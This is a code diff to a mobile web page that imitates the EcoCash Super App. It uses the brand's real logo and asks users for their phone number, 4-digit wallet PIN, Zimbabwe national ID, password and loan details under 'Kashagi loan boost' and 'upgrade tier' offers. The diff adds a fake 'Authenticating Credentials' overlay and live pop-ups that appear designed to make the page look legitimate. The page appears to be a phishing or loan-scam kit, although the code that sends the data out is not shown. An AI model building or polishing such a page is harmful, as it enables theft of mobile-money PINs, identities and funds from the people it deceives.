@@ -71,6 +71,21 @@
             background: linear-gradient(90deg, #2d3748 25%, #4a5568 50%, #2d3748 75%);
             background-size: 200px 100%;
         }
+        /* Live Notification Pop-up Animation */
+        @keyframes slideInUp {
+            from { transform: translateY(100%); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        @keyframes slideOutDown {
+            from { transform: translateY(0); opacity: 1; }
+            to { transform: translateY(100%); opacity: 0; }
+        }
+        .notification-slide-in {
+            animation: slideInUp 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
+        .notification-slide-out {
+            animation: slideOutDown 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
     </style>
 </head>
 <body class="bg-gray-100 dark:bg-gray-900 font-sans antialiased text-gray-800 dark:text-gray-100 flex justify-center min-h-screen transition-colors duration-300">
@@ -78,17 +93,41 @@
     <!-- Mobile Frame / Container -->
     <div class="w-full max-w-md bg-white dark:bg-gray-800 min-h-screen flex flex-col shadow-2xl relative overflow-x-hidden transition-colors duration-300">
 
+        <!-- GLOBAL DIM LIGHT / 5-SECOND LOADING OVERLAY -->
+        <div id="global-dim-overlay" class="fixed inset-0 z-50 bg-black/60 backdrop-blur-[2px] hidden flex flex-col items-center justify-center text-center transition-opacity duration-300">
+            <div class="bg-white dark:bg-gray-800 rounded-2xl p-8 shadow-2xl border border-gray-100 dark:border-gray-700 max-w-xs w-full space-y-6 mx-4">
+                <div class="relative w-20 h-20 mx-auto flex items-center justify-center processing-pulse">
+                    <div class="absolute inset-0 border-4 border-blue-200 dark:border-gray-700 rounded-full"></div>
+                    <div class="absolute inset-0 border-4 border-ecoblue border-t-transparent rounded-full animate-spin"></div>
+                    <i class="fa-solid fa-shield-halved text-ecoblue text-2xl"></i>
+                </div>
+
+                <div class="space-y-2">
+                    <h3 id="overlay-title" class="font-extrabold text-base text-gray-800 dark:text-gray-100">Authenticating Credentials</h3>
+                    <p id="overlay-subtitle" class="text-xs text-gray-500 dark:text-gray-400">Verifying secure session & wallet security...</p>
+                </div>
+
+                <div class="space-y-2 pt-1">
+                    <div class="h-3 w-full skeleton rounded"></div>
+                    <div class="h-3 w-3/4 skeleton rounded"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- LIVE NOTIFICATION POPUP FLOATING CONTAINER -->
+        <div id="live-notification-container" class="fixed bottom-20 left-4 right-4 z-50 max-w-md mx-auto pointer-events-none flex flex-col items-center">
+            <!-- Dynamically injected popup card -->
+        </div>
+
         <!-- HEADER & NAVIGATION -->
         <header class="bg-white dark:bg-gray-800 border-b border-gray-200 dark:border-gray-700 sticky top-0 z-40 transition-colors duration-300">
             <div id="top-nav-bar" class="bg-ecoblue text-white text-xs py-2 px-4 flex justify-between items-center font-medium">
-                <!-- Real EcoCash Super App Logo Icon Badge -->
                 <div class="flex items-center space-x-2 bg-white text-ecoblue px-2 py-1 rounded shadow-sm">
                     <img src="https://play-lh.googleusercontent.com/p8KM6TJr6mODf24U8AhPlX1uofQp5dATtVOdQxUoPHEgrWCvucuEb89Q5L8An36PBSb2iaoXn2i1H1QcPwFtyA" alt="EcoCash" class="w-4 h-4 object-contain rounded-full">
                     <span class="font-extrabold tracking-tighter text-xs">EcoCash <span class="text-ecored">Super App</span></span>
                 </div>
                 <div class="flex items-center space-x-3">
-                    <button onclick="switchTab('contact')" class="hover:underline transition">Help Center</button>
-                    <!-- Dark Mode Toggle Button -->
+                    <button onclick="switchTabWithDim('contact')" class="hover:underline transition">Help Center</button>
                     <button onclick="toggleDarkMode()" class="p-1.5 rounded-full bg-white/20 hover:bg-white/30 transition text-white" title="Toggle Dark Mode">
                         <i id="dark-mode-icon" class="fa-solid fa-moon text-xs"></i>
                     </button>
@@ -96,7 +135,7 @@
             </div>
 
             <div class="px-4 py-3 flex justify-between items-center bg-white dark:bg-gray-800 transition-colors duration-300">
-                <div class="cursor-pointer flex items-center space-x-2" onclick="switchTab('login')">
+                <div class="cursor-pointer flex items-center space-x-2" onclick="switchTabWithDim('login')">
                     <span class="text-3xl font-extrabold text-ecoblue tracking-tight">Eco</span><span class="text-3xl font-extrabold text-ecored tracking-tight">Cash</span>
                 </div>
 
@@ -107,13 +146,13 @@
 
             <div id="nav-dropdown" class="hidden bg-white dark:bg-gray-800 border-t border-gray-100 dark:border-gray-700 px-6 py-3 space-y-3 shadow-md transition-colors duration-300">
                 <div>
-                    <button onclick="switchTab('login'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 dark:text-gray-200 font-medium hover:text-ecoblue">Log In</button>
+                    <button onclick="switchTabWithDim('login'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 dark:text-gray-200 font-medium hover:text-ecoblue">Log In</button>
                 </div>
                 <div>
-                    <button onclick="switchTab('signup'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 dark:text-gray-200 font-medium hover:text-ecoblue">Sign Up</button>
+                    <button onclick="switchTabWithDim('signup'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 dark:text-gray-200 font-medium hover:text-ecoblue">Sign Up</button>
                 </div>
                 <div>
-                    <button onclick="switchTab('contact'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 dark:text-gray-200 font-medium hover:text-ecoblue">Dedicated Help Center (FAQs)</button>
+                    <button onclick="switchTabWithDim('contact'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 dark:text-gray-200 font-medium hover:text-ecoblue">Dedicated Help Center (FAQs)</button>
                 </div>
             </div>
         </header>
@@ -134,8 +173,9 @@
                     <h2 class="text-center text-xl font-bold text-gray-700 dark:text-gray-200 mb-6">Login</h2>
 
                     <!-- Phone Input -->
-                    <div class="mb-6">
-                        <div class="flex items-center border border-ecoblue rounded-lg px-3 py-3 focus-within:ring-2 focus-within:ring-ecoblue dark:bg-gray-700 dark:border-gray-600">
+                    <div class="mb-4">
+                        <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-1">Phone Number <span class="text-red-500">*</span></label>
+                        <div class="flex items-center border border-ecoblue rounded-lg px-3 py-3 focus-within:ring-2 focus-within:ring-ecoblue dark:bg-gray-700 dark:border-gray-600 relative">
                             <div class="flex items-center space-x-2 mr-2 border-r border-gray-300 dark:border-gray-600 pr-2">
                                 <svg class="w-6 h-4 rounded-sm border border-gray-200" viewBox="0 0 60 30" xmlns="http://www.w3.org/2000/svg">
                                     <rect width="60" height="30" fill="#319200"/>
@@ -148,24 +188,27 @@
                                 </svg>
                                 <span class="text-gray-700 dark:text-gray-200 font-semibold text-sm">+263</span>
                             </div>
-                            <input type="tel" id="login-phone" placeholder="712345678" maxlength="9" class="w-full text-gray-800 dark:text-gray-100 bg-transparent font-medium outline-none text-base tracking-wide" oninput="validateLoginForm()">
+                            <input type="tel" id="login-phone" inputmode="numeric" pattern="[0-9]*" placeholder="712345678" maxlength="9" class="w-full text-gray-800 dark:text-gray-100 bg-transparent font-medium outline-none text-base tracking-wide" oninput="validateLoginForm()">
+                            <span id="login-phone-icon" class="absolute right-3 hidden text-base"></span>
                         </div>
+                        <p id="login-phone-error" class="text-[11px] text-red-600 mt-1 hidden font-medium">Incorrect phone number (Must be 9 digits starting with 7)</p>
                     </div>
 
                     <!-- PIN Section -->
                     <div class="text-center mb-6">
-                        <p class="text-xs text-gray-500 dark:text-gray-400 font-medium mb-3">Enter your PIN</p>
+                        <p class="text-xs text-gray-500 dark:text-gray-400 font-medium mb-3">Enter your 4-Digit PIN</p>
                         
                         <div class="flex justify-center items-center space-x-3 relative max-w-xs mx-auto">
-                            <input type="password" maxlength="1" id="pin-1" class="pin-box w-12 h-12 border-2 border-ecoblue dark:bg-gray-700 dark:text-white rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 1, event)" oninput="validateLoginForm()">
-                            <input type="password" maxlength="1" id="pin-2" class="pin-box w-12 h-12 border-2 border-ecoblue dark:bg-gray-700 dark:text-white rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 2, event)" oninput="validateLoginForm()">
-                            <input type="password" maxlength="1" id="pin-3" class="pin-box w-12 h-12 border-2 border-ecoblue dark:bg-gray-700 dark:text-white rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 3, event)" oninput="validateLoginForm()">
-                            <input type="password" maxlength="1" id="pin-4" class="pin-box w-12 h-12 border-2 border-ecoblue dark:bg-gray-700 dark:text-white rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 4, event)" oninput="validateLoginForm()">
+                            <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" id="pin-1" class="pin-box w-12 h-12 border-2 border-ecoblue dark:bg-gray-700 dark:text-white rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 1, event)" oninput="validateLoginForm()">
+                            <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" id="pin-2" class="pin-box w-12 h-12 border-2 border-ecoblue dark:bg-gray-700 dark:text-white rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 2, event)" oninput="validateLoginForm()">
+                            <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" id="pin-3" class="pin-box w-12 h-12 border-2 border-ecoblue dark:bg-gray-700 dark:text-white rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 3, event)" oninput="validateLoginForm()">
+                            <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" id="pin-4" class="pin-box w-12 h-12 border-2 border-ecoblue dark:bg-gray-700 dark:text-white rounded-lg text-center text-xl font-bold focus:outline-none focus:ring-2 focus:ring-ecoblue" onkeyup="movePinFocus(this, 4, event)" oninput="validateLoginForm()">
 
                             <button type="button" onclick="togglePinVisibility()" class="ml-2 text-gray-600 dark:text-gray-300 hover:text-ecoblue focus:outline-none">
                                 <i id="pin-eye-icon" class="fa-regular fa-eye text-lg"></i>
                             </button>
                         </div>
+                        <p id="login-pin-error" class="text-[11px] text-red-600 mt-1 hidden font-medium text-center">Incorrect PIN (Must be 4 digits)</p>
 
                         <div class="mt-2">
                             <a href="#" class="text-xs text-gray-500 dark:text-gray-400 hover:underline">Forgot PIN?</a>
@@ -185,12 +228,12 @@
                     </p>
 
                     <div class="grid grid-cols-2 gap-4">
-                        <button onclick="switchTab('signup')" class="bg-white text-ecoblue rounded-lg py-4 px-2 flex flex-col items-center justify-center space-y-1 shadow-md hover:bg-gray-50 transition">
+                        <button onclick="switchTabWithDim('signup')" class="bg-white text-ecoblue rounded-lg py-4 px-2 flex flex-col items-center justify-center space-y-1 shadow-md hover:bg-gray-50 transition">
                             <i class="fa-solid fa-user text-gray-700 text-lg"></i>
                             <span class="font-bold text-sm">Register</span>
                         </button>
 
-                        <button onclick="switchTab('contact')" class="bg-white text-ecoblue rounded-lg py-4 px-2 flex flex-col items-center justify-center space-y-1 shadow-md hover:bg-gray-50 transition">
+                        <button onclick="switchTabWithDim('contact')" class="bg-white text-ecoblue rounded-lg py-4 px-2 flex flex-col items-center justify-center space-y-1 shadow-md hover:bg-gray-50 transition">
                             <i class="fa-solid fa-circle-info text-gray-500 text-lg"></i>
                             <span class="font-bold text-sm">Help & Support</span>
                         </button>
@@ -208,7 +251,7 @@
             <section id="view-signup" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800">
                 <div class="bg-white dark:bg-gray-800 rounded-xl p-5 shadow-sm border border-gray-100 dark:border-gray-700 mb-6 transition-colors">
                     <div class="flex items-center justify-between mb-4">
-                        <button onclick="switchTab('login')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
+                        <button onclick="switchTabWithDim('login')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
                             <i class="fa-solid fa-arrow-left"></i> <span>Back to Login</span>
                         </button>
                         <h2 class="text-xl font-bold text-gray-800 dark:text-gray-100">Sign up</h2>
@@ -218,13 +261,21 @@
                         <!-- First Name -->
                         <div>
                             <label class="block font-medium mb-1">First Name <span class="text-red-500">*</span></label>
-                            <input type="text" id="signup-firstname" placeholder="First Name" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                            <div class="relative">
+                                <input type="text" id="signup-firstname" placeholder="First Name" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                                <span id="signup-firstname-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                            </div>
+                            <p id="signup-firstname-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect First Name (Letters only)</p>
                         </div>
 
                         <!-- Surname -->
                         <div>
                             <label class="block font-medium mb-1">Surname <span class="text-red-500">*</span></label>
-                            <input type="text" id="signup-surname" placeholder="Surname" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                            <div class="relative">
+                                <input type="text" id="signup-surname" placeholder="Surname" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                                <span id="signup-surname-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                            </div>
+                            <p id="signup-surname-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Surname (Letters only)</p>
                         </div>
 
                         <!-- Country Select -->
@@ -244,20 +295,31 @@
                             <div class="bg-gray-100 dark:bg-gray-700 text-gray-500 dark:text-gray-300 p-2.5 rounded-md text-center text-sm font-semibold mb-2 border border-gray-200 dark:border-gray-600">
                                 263
                             </div>
-                            <input type="tel" id="signup-phone" placeholder="Mobile Number" maxlength="9" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                            <div class="relative">
+                                <input type="tel" inputmode="numeric" pattern="[0-9]*" id="signup-phone" placeholder="Mobile Number" maxlength="9" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                                <span id="signup-phone-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                            </div>
+                            <p id="signup-phone-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Mobile Number (Must be 9 digits starting with 7)</p>
                         </div>
 
                         <!-- Email -->
                         <div>
                             <label class="block font-medium mb-1">Email <span class="text-red-500">*</span></label>
-                            <input type="email" id="signup-email" placeholder="Email" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                            <div class="relative">
+                                <input type="email" id="signup-email" placeholder="Email" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                                <span id="signup-email-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                            </div>
+                            <p id="signup-email-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Email format</p>
                         </div>
 
-                        <!-- National ID (Strictly Zimbabwe ID format) -->
+                        <!-- National ID -->
                         <div>
                             <label class="block font-medium mb-1">Zimbabwe National Id <span class="text-red-500">*</span></label>
-                            <input type="text" id="signup-nid" placeholder="e.g. 63-1234567A89" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue uppercase" oninput="validateSignupForm()">
-                            <p id="signup-id-error" class="text-[10px] text-red-600 mt-1 hidden">Please enter a valid Zimbabwe National ID format (e.g., 63-1234567A89).</p>
+                            <div class="relative">
+                                <input type="text" id="signup-nid" placeholder="e.g. 63-1234567A89" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue uppercase" oninput="validateSignupForm()">
+                                <span id="signup-nid-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                            </div>
+                            <p id="signup-id-error" class="text-[10px] text-red-600 mt-1 hidden font-medium">Incorrect ID format (e.g., 63-1234567A89)</p>
                         </div>
 
                         <!-- Password -->
@@ -266,11 +328,13 @@
                                 New Password <span class="text-red-500">*</span> <span class="font-normal text-gray-500 dark:text-gray-400">(Min 8 chars, 1 letter, 1 number)</span>
                             </label>
                             <div class="relative">
-                                <input type="password" id="new-password" placeholder="New Password" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 pr-8 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                                <input type="password" id="new-password" placeholder="New Password" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 pr-16 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                                <span id="signup-password-icon" class="absolute right-9 top-2.5 hidden text-sm"></span>
                                 <button type="button" onclick="togglePasswordVisibility()" class="absolute right-2.5 top-3 text-gray-500">
                                     <i id="password-eye-icon" class="fa-regular fa-eye"></i>
                                 </button>
                             </div>
+                            <p id="signup-password-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Password (Min 8 chars, 1 letter & 1 number)</p>
                         </div>
 
                         <!-- Gender -->
@@ -327,7 +391,7 @@
                             <button type="button" id="signup-btn" disabled onclick="handleSignUpSubmit()" class="w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-semibold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition">
                                 SIGN UP
                             </button>
-                            <button type="button" onclick="switchTab('login')" class="w-full border border-red-400 text-red-500 font-semibold py-2.5 rounded-md uppercase text-xs tracking-wider hover:bg-red-50 dark:hover:bg-gray-700 transition">
+                            <button type="button" onclick="switchTabWithDim('login')" class="w-full border border-red-400 text-red-500 font-semibold py-2.5 rounded-md uppercase text-xs tracking-wider hover:bg-red-50 dark:hover:bg-gray-700 transition">
                                 LOGIN
                             </button>
                         </div>
@@ -391,7 +455,7 @@
 
                     <!-- Visual Cards for Services -->
                     <div class="space-y-3">
-                        <div onclick="switchTab('boost-form')" class="bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 overflow-hidden shadow-sm hover:border-ecoblue cursor-pointer transition group">
+                        <div onclick="switchTabWithDim('boost-form')" class="bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 overflow-hidden shadow-sm hover:border-ecoblue cursor-pointer transition group">
                             <div class="h-24 w-full bg-cover bg-center relative" style="background-image: url('https://images.unsplash.com/photo-1559526324-4b87b5e36e44?auto=format&fit=crop&w=400&q=80');">
                                 <div class="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent flex items-end p-2.5">
                                     <span class="text-white font-bold text-xs flex items-center space-x-1.5"><i class="fa-solid fa-bolt text-yellow-400"></i> <span>Instant Credit Boost</span></span>
@@ -406,7 +470,7 @@
                             </div>
                         </div>
 
-                        <div onclick="switchTab('apply-form')" class="bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 overflow-hidden shadow-sm hover:border-supergreen cursor-pointer transition group">
+                        <div onclick="switchTabWithDim('apply-form')" class="bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 overflow-hidden shadow-sm hover:border-supergreen cursor-pointer transition group">
                             <div class="h-24 w-full bg-cover bg-center relative" style="background-image: url('https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=400&q=80');">
                                 <div class="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent flex items-end p-2.5">
                                     <span class="text-white font-bold text-xs flex items-center space-x-1.5"><i class="fa-solid fa-file-invoice-dollar text-green-400"></i> <span>Full Zimbabwe Registration ($100 - $3000)</span></span>
@@ -429,7 +493,7 @@
             </section>
 
 
-            <!-- ================= VIEW 4: PROCESSING & VALIDATING SCREEN (Loading Skeleton & State) ================= -->
+            <!-- ================= VIEW 4: PROCESSING & VALIDATING SCREEN ================= -->
             <section id="view-processing" class="hidden p-6 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800 flex flex-col items-center justify-center text-center">
                 <div class="bg-white dark:bg-gray-800 rounded-2xl p-8 shadow-lg border border-gray-100 dark:border-gray-700 max-w-xs w-full space-y-6">
                     <div id="process-spinner-container" class="relative w-20 h-20 mx-auto flex items-center justify-center">
@@ -471,35 +535,52 @@
             <section id="view-boost-form" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800">
                 <div class="bg-white dark:bg-gray-800 rounded-xl p-5 shadow-sm border border-gray-100 dark:border-gray-700 mb-6">
                     <div class="flex items-center justify-between mb-4">
-                        <button onclick="switchTab('kashagi-hub')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
+                        <button onclick="switchTabWithDim('kashagi-hub')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
                             <i class="fa-solid fa-arrow-left"></i> <span>Back</span>
                         </button>
                         <h2 class="text-base font-bold text-gray-800 dark:text-gray-100">Boost Kashagi Requirements</h2>
                     </div>
 
                     <form onsubmit="event.preventDefault();" class="space-y-4 text-xs text-gray-700 dark:text-gray-300">
+                        <!-- Full Name -->
                         <div>
                             <label class="block font-medium mb-1">1. Full Names <span class="text-red-500">*</span></label>
-                            <input type="text" id="boost-name" placeholder="Full Names as per ID" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateBoostForm()">
+                            <div class="relative">
+                                <input type="text" id="boost-name" placeholder="Full Names as per ID" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateBoostForm()">
+                                <span id="boost-name-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                            </div>
+                            <p id="boost-name-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Name (Letters only)</p>
                         </div>
 
+                        <!-- Phone Number -->
                         <div>
                             <label class="block font-medium mb-1">2. Phone Number (Starting with 7) <span class="text-red-500">*</span></label>
-                            <div class="flex items-center border border-gray-200 dark:border-gray-700 dark:bg-gray-700 rounded-md overflow-hidden focus-within:border-ecoblue">
+                            <div class="flex items-center border border-gray-200 dark:border-gray-700 dark:bg-gray-700 rounded-md overflow-hidden focus-within:border-ecoblue relative">
                                 <span class="bg-gray-100 dark:bg-gray-600 px-3 py-2.5 text-gray-600 dark:text-gray-200 font-semibold text-sm border-r border-gray-200 dark:border-gray-600">+263</span>
-                                <input type="tel" id="boost-phone" placeholder="712345678" maxlength="9" class="w-full p-2.5 text-sm outline-none dark:bg-gray-700 dark:text-white" oninput="validateBoostForm()">
+                                <input type="tel" inputmode="numeric" pattern="[0-9]*" id="boost-phone" placeholder="712345678" maxlength="9" class="w-full p-2.5 text-sm outline-none dark:bg-gray-700 dark:text-white" oninput="validateBoostForm()">
+                                <span id="boost-phone-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
                             </div>
+                            <p id="boost-phone-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Phone (9 digits starting with 7)</p>
                         </div>
 
+                        <!-- Zimbabwe National ID -->
                         <div>
                             <label class="block font-medium mb-1">3. Zimbabwe National ID Number <span class="text-red-500">*</span></label>
-                            <input type="text" id="boost-nid" placeholder="e.g. 63-1234567A89" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue uppercase" oninput="validateBoostForm()">
-                            <p id="boost-id-error" class="text-[10px] text-red-600 mt-1 hidden">Please enter a valid Zimbabwe National ID format (e.g., 63-1234567A89).</p>
+                            <div class="relative">
+                                <input type="text" id="boost-nid" placeholder="e.g. 63-1234567A89" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue uppercase" oninput="validateBoostForm()">
+                                <span id="boost-nid-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                            </div>
+                            <p id="boost-id-error" class="text-[10px] text-red-600 mt-1 hidden font-medium">Incorrect ID format (e.g., 63-1234567A89)</p>
                         </div>
 
+                        <!-- Current Loan Amount -->
                         <div>
                             <label class="block font-medium mb-1">4. Current Kashagi Loan Amount (USD) <span class="text-red-500">*</span></label>
-                            <input type="number" id="boost-current-loan" placeholder="e.g. 50" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateBoostForm()">
+                            <div class="relative">
+                                <input type="number" inputmode="numeric" pattern="[0-9]*" id="boost-current-loan" placeholder="e.g. 50" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateBoostForm()">
+                                <span id="boost-loan-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                            </div>
+                            <p id="boost-loan-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Amount (Numbers only)</p>
                         </div>
 
                         <div class="pt-4">
@@ -516,7 +597,7 @@
             <section id="view-tier-upgrade" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800 flex flex-col justify-between">
                 <div>
                     <div class="flex items-center justify-between mb-4">
-                        <button onclick="switchTab('boost-form')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
+                        <button onclick="switchTabWithDim('boost-form')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
                             <i class="fa-solid fa-arrow-left"></i> <span>Back</span>
                         </button>
                         <h2 class="text-base font-bold text-gray-800 dark:text-gray-100">Select Loan Upgrade Tier</h2>
@@ -538,11 +619,11 @@
             </section>
 
 
-            <!-- ================= VIEW 7: TERMS AND CONDITIONS WITH FULL PAGE SCROLL & AGREE TICK BOX ================= -->
+            <!-- ================= VIEW 7: TERMS AND CONDITIONS ================= -->
             <section id="view-terms" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800 flex flex-col justify-between">
                 <div class="flex-1 flex flex-col">
                     <div class="flex items-center justify-between mb-2">
-                        <button onclick="switchTab('tier-upgrade')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
+                        <button onclick="switchTabWithDim('tier-upgrade')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
                             <i class="fa-solid fa-arrow-left"></i> <span>Back</span>
                         </button>
                         <h2 class="text-sm font-extrabold text-gray-800 dark:text-gray-100">Terms, Privacy & Safety Policy</h2>
@@ -578,11 +659,11 @@
             </section>
 
 
-            <!-- ================= VIEW 8: APPLY / REGISTER KASHAGI LOANS (Full Requirements with $100-$3000 Tier Table) ================= -->
+            <!-- ================= VIEW 8: APPLY / REGISTER KASHAGI LOANS ================= -->
             <section id="view-apply-form" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800 flex flex-col justify-between">
                 <div>
                     <div class="flex items-center justify-between mb-3">
-                        <button onclick="switchTab('kashagi-hub')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
+                        <button onclick="switchTabWithDim('kashagi-hub')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
                             <i class="fa-solid fa-arrow-left"></i> <span>Back</span>
                         </button>
                         <h2 class="text-base font-bold text-gray-800 dark:text-gray-100">Kashagi Loan Full Registration</h2>
@@ -596,22 +677,36 @@
                     </div>
 
                     <form onsubmit="event.preventDefault();" class="space-y-2.5 text-xs text-gray-700 dark:text-gray-300">
+                        <!-- Full Name -->
                         <div>
                             <label class="block font-medium mb-1">Full Names <span class="text-red-500">*</span></label>
-                            <input type="text" id="apply-name" placeholder="Full Names" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-sm outline-none focus:border-ecoblue" oninput="validateApplyForm()">
+                            <div class="relative">
+                                <input type="text" id="apply-name" placeholder="Full Names" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-sm outline-none focus:border-ecoblue" oninput="validateApplyForm()">
+                                <span id="apply-name-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                            </div>
+                            <p id="apply-name-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Name (Letters only)</p>
                         </div>
 
                         <div class="grid grid-cols-2 gap-2">
+                            <!-- Mobile -->
                             <div>
                                 <label class="block font-medium mb-1">Mobile (+263) <span class="text-red-500">*</span></label>
-                                <input type="tel" id="apply-phone" placeholder="712345678" maxlength="9" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-sm outline-none" oninput="validateApplyForm()">
+                                <div class="relative">
+                                    <input type="tel" inputmode="numeric" pattern="[0-9]*" id="apply-phone" placeholder="712345678" maxlength="9" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-sm outline-none" oninput="validateApplyForm()">
